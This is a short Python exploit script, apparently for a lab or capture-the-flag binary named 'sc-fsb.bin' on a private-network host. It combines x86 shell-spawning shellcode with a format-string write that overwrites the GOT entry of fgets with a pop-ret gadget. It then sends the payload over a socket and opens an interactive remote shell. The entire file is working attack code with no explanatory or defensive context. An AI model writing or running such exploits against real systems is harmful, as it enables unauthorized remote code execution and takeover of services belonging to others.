#!/usr/bin/env python
from sc_pwn import *

target     = {'host':'192.168.75.139','port':8080}

binf = ELF('sc-fsb.bin', rop=True)

addr_got_fgets      = binf.got('fgets')
addr_pop            = binf.ropgadget('pop', 'ret')

#==========
def attack(cmn):
    sc = ShellCode('x86')
    shellcode = sc.sh()

    fsb = FSB(header=len(shellcode),size=2)
    fsb.set_adrval(addr_got_fgets, addr_pop)
    fsb.auto_write(index=7)
    
    exploit  = shellcode
    exploit += fsb.get()
    
    cmn.read_until('>> ')
    cmn.sendln(exploit)

#==========

if __name__=='__main__':
    cmn = Communicate(target,mode='SOCKET')
    attack(cmn)
    
    sh = Shell(cmn)
    sh.select()
    del(sh)
    
    del(cmn)
    
#==========
